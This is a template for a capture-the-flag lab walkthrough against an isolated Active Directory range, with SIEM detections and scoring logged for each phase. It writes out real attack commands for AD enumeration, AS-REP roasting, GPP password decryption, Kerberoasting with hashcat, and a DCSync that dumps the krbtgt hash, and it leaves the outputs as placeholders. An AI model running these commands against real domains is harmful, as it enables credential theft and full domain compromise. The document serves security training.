# SC-02 Nexora AD — Kill-Chain Walkthrough Evidence
<!-- Generated by WS7. To be filled during live demo run. -->

**Status:** TEMPLATE — replace with real terminal transcript during WS10 live walkthrough.

**Target:** 172.20.2.20 (Nexora AD Domain Controller), 172.20.2.40 (Fileserver)  
**Profile:** `docker compose --profile sc02 up -d`  
**Scenario:** SC-02 Active Directory Compromise

---

## Phase 1 — AD Enumeration

```
$ nmap -sV -p 88,389,445,636,3268 172.20.2.20
[TRANSCRIPT: paste nmap showing Kerberos/LDAP/SMB]

$ smbclient -L 172.20.2.20 -N
[TRANSCRIPT: share enumeration output]

$ ldapsearch -x -H ldap://172.20.2.20 -b "dc=nexora,dc=local"
[TRANSCRIPT: LDAP query output showing users/groups]
```

**Findings:** Domain users enumerated, SYSVOL accessible  
**SIEM events:** AD enumeration detected (MEDIUM)  
**Phase advancement:** ✅ after ldapsearch/smbclient

---

## Phase 2 — Credential Attacks

```
$ impacket-GetNPUsers nexora.local/ -no-pass -usersfile users.txt -dc-ip 172.20.2.20
[TRANSCRIPT: AS-REP roasting — rgreen hash captured]

$ smbclient //172.20.2.20/SYSVOL -N
$ get Policies/{GUID}/Machine/Preferences/Groups/Groups.xml
[TRANSCRIPT: GPP cPassword extracted]

$ gpp-decrypt <cpassword_value>
[TRANSCRIPT: decrypted svc_backup password]
```

**FLAG-SC02-1 (AS-REP hash):** `flag_candidate` nudge fired ✅ Captured ✅  
**FLAG-SC02-2 (GPP password):** Captured ✅  
**SIEM events:** AS-REP roasting (HIGH), GPP credential access (HIGH)

---

## Phase 3 — Privilege Escalation

```
$ impacket-GetUserSPNs nexora.local/svc_backup:<password> -dc-ip 172.20.2.20 -request
[TRANSCRIPT: Kerberoastable SPN hash for MSSQLSvc]

$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
[TRANSCRIPT: cracked service account password]
```

**FLAG-SC02-3 (Kerberoast hash):** Captured ✅  
**SIEM events:** Kerberoasting detected (CRITICAL)

---

## Phase 4 — Domain Compromise

```
$ impacket-secretsdump nexora.local/it.admin:<password>@172.20.2.20
[TRANSCRIPT: DCSync — NTDS.dit hashes including krbtgt]
```

**FLAG-SC02-4 (DCSync krbtgt):** Captured ✅  
**SIEM events:** DCSync detected (CRITICAL), Account 4662 event

---

## Final Score

| Metric | Value |
|--------|-------|
| Flags captured | 4/4 |
| Hints used | — |
| Time bonus | — |
| Final score | — |

---

## Network Isolation Verification

```
$ ping 8.8.8.8   # Expected: unreachable
$ smbclient -L 172.20.2.20 -N   # Expected: responds (internal)
```

**Isolation result:** All-blocked ✅
